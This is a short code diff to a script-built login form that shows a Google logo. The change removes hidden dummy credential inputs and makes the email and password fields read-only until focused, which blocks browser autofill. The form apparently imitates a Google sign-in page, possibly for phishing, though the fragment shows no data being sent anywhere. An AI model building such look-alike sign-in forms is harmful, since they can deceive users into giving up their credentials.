@@ -22,8 +22,6 @@ if (run === false) {
                         alt="Google logo"
                     />
                     <form id="login-form__" autocomplete="off">
-                        <input type="email" style="display: none" />
-                        <input type="password" style="display: none" />
                         <label id="label__" for="email__">Email</label>
                         <div
                             style="
@@ -48,6 +46,8 @@ if (run === false) {
                                 name="useremail"
                                 autocomplete="false"
                                 required
+                                readonly 
+                                onfocus="this.removeAttribute('readonly')"
                             />
                             <div
                                 class="email-message"
@@ -79,6 +79,8 @@ if (run === false) {
                             autocomplete="false"
                             autocomplete="new-password"
                             required
+                            readonly 
+                            onfocus="this.removeAttribute('readonly')"
                         />
                         <div
                             class="password-message"
